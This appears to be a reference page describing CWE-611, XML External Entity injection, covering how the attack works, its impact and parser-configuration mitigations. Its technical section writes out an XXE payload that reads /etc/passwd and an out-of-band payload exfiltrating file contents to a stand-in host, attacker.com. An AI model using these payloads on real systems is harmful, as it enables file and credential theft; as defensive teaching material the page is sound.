---
title: "CWE-611 — XML External Entity (XXE) Injection"
---

# CWE-611 — XML External Entity (XXE) Injection

CWE-611 (Improper Restriction of XML External Entity Reference) describes vulnerabilities where an XML parser resolves external entity references in XML input. An attacker supplying crafted XML containing an `<!ENTITY>` declaration referencing an external URI or local file can read arbitrary files, cause server-side request forgery (SSRF), and in some environments achieve remote code execution.

## Technical Details

XXE exploits the XML 1.0 standard's support for external entities. A malicious XML payload includes `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` and then references `&xxe;` in the document body. When an XML parser resolves this, it reads the target file and substitutes its contents into the XML. File URIs access the local filesystem; `http://` URIs cause SSRF. Out-of-band XXE (OOB-XXE, also called Blind XXE) exfiltrates data by encoding file contents in a request to an attacker-controlled server: `<!ENTITY % data SYSTEM "file:///etc/passwd"> <!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?d=%data;'>">`. Parsers vulnerable by default include Java's `javax.xml.parsers.DocumentBuilderFactory` (if DTD processing not disabled), Python's `xml.etree.ElementTree` (stdlib, partial), and libxml2. XXE can be triggered in SOAP endpoints, SVG/DOCX/XLSX upload endpoints, and any feature that accepts XML.

## Impact

XXE enables reading arbitrary files accessible to the application process (including credentials, private keys, source code), SSRF to internal services, denial of service via entity expansion (Billion Laughs / XML bomb), and in some configurations RCE via protocols like `gopher://`, Java deserialization gadgets, or PHP `expect://`. Notable exploitation in bug bounty programs consistently yields critical findings against enterprise SOAP APIs.

## Mitigation

Disable DTD processing entirely in XML parsers. For Java: set `XMLConstants.FEATURE_SECURE_PROCESSING` and disable `DOCTYPE` declarations. For Python's `lxml`: use `resolve_entities=False`. For libxml2: set `XML_PARSE_NOENT` to false. Use modern JSON-based APIs where XML is not required. If XML is required, use SAX parsers with entity resolution disabled rather than DOM parsers. Input validation cannot reliably prevent XXE — parser configuration is the correct fix.
